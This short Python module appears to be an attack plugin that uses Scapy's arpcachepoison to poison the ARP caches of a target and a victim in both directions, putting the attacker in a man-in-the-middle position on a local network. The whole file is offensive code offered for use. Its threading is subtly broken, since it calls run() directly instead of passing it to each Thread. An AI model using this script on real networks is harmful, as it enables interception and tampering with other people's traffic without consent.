from threading import Thread
import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

from scapy.layers.l2 import arpcachepoison
from scapy.all import sendp



def run(target, victim):

    arpcachepoison(target=str(target), victim=str(victim), interval=0)




def run_attack(config):

    target = config.target
    victim = config.victim

    try:
        t1 = Thread(run(target, victim))
        t2 = Thread(run(victim, target))

        t1.start()
        t2.start()

    except KeyboardInterrupt:
        pass







